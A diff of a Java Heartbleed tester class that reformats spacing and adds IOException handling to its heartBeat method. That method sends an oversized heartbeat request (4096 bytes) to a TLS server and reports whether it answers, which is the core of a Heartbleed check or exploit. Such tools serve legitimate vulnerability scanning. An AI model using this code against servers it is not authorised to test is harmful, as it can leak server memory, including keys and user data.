@@ -47,7 +47,7 @@ public class HeartBleed {
     };
 
     public boolean connect(String server, int port) {
-        boolean isConn=false;
+        boolean isConn = false;
         try {
             InetAddress ipTargeAddress = InetAddress.getByName(server);
             try {
@@ -59,21 +59,21 @@ public class HeartBleed {
                     }
                     inStr = connection.getInputStream();
                     outStr = connection.getOutputStream();
-                    isConn=true;
-                }else{
+                    isConn = true;
+                } else {
                     System.out.println("Destination Host Unreachable!");
-                    isConn=false;
+                    isConn = false;
                 }
             }
             catch (IOException ex) {
                 Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
-                isConn=false;
+                isConn = false;
             }
-            
+
         }
         catch (UnknownHostException ex) {
             Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
-            isConn=false;
+            isConn = false;
         }
         return isConn;
     }
@@ -99,32 +99,38 @@ public class HeartBleed {
     }
 
     //sends/receives the heartbeat
-    public synchronized boolean heartBeat(String message) throws IOException {
+    public synchronized boolean heartBeat(String message) {
         boolean statusServer = false;
         System.out.println("Sending Heartbeat...");
-        outStr.write(makeHeartBeat(message, 4096));
-        outStr.flush();
+        try {
+            outStr.write(makeHeartBeat(message, 4096));
+            outStr.flush();
+            while (true) {
+                finalMessage = readPacket(inStr);
 
-        while (true) {
-            finalMessage = readPacket(inStr);
-
-            if (finalMessage.type == 24) {
-                System.out.println("Heartbeat recieved!");
-                System.out.printf("Type: %d Version: %d Length: %d\n", finalMessage.type, finalMessage.version, finalMessage.length);
-                statusServer = true;
-                break;
-            }
-            if (finalMessage.type == 21) {
-                System.out.println("Error");
-                statusServer = false;
-                break;
-            }
-            if (finalMessage.type == 0) {
-                System.out.println("No heartbeat response received, server likely not vulnerable");
-                statusServer = false;
-                break;
+                if (finalMessage.type == 24) {
+                    System.out.println("Heartbeat recieved!");
+                    System.out.printf("Type: %d Version: %d Length: %d\n", finalMessage.type, finalMessage.version, finalMessage.length);
+                    statusServer = true;
+                    break;
+                }
+                if (finalMessage.type == 21) {
+                    System.out.println("Error");
+                    statusServer = false;
+                    break;
+                }
+                if (finalMessage.type == 0) {
+                    System.out.println("No heartbeat response received, server likely not vulnerable");
+                    statusServer = false;
+                    break;
+                }
             }
         }
+        catch (IOException ex) {
+            Logger.getLogger(HeartBleed.class.getName()).log(Level.SEVERE, null, ex);
+            statusServer = false;
+        }
+
         return statusServer;
     }
 
@@ -182,7 +188,6 @@ public class HeartBleed {
             messageBytes = message.getBytes("UTF-8");
         }
         catch (UnsupportedEncodingException e) {
-
             e.printStackTrace();
         }
 
